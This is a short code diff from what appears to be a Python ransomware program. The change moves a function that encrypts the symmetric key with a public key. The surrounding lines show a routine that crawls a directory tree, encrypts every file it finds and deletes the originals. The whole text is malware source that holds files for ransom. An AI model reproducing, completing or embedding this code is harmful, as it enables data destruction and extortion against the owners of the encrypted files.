@@ -44,6 +44,11 @@ def encrypt_file(filepath, fernetobj):
         encrypted_file.write(encrypted_content)
         encrypted_file.close()
 
+def create_enc_key():
+    encrypted_symmetric_key = encrypt_with_public_key(symkey, public_key)
+    with open(utils.get_symkey_filepath(), "wb") as f:
+        f.write(encrypted_symmetric_key)
+
 def crawl(basedir):
     for path, curdir, files in os.walk(basedir):
         for dir in utils.get_unwanted_directories():
@@ -56,11 +61,6 @@ def crawl(basedir):
             print(filepath)
             encrypt_file(filepath, f)
             utils.remove_file(filepath)
-
-def create_enc_key():
-    encrypted_symmetric_key = encrypt_with_public_key(symkey, public_key)
-    with open(utils.get_symkey_filepath(), "wb") as f:
-        f.write(encrypted_symmetric_key)
 
 if __name__ == "__main__":
     public_key = load_public_key()
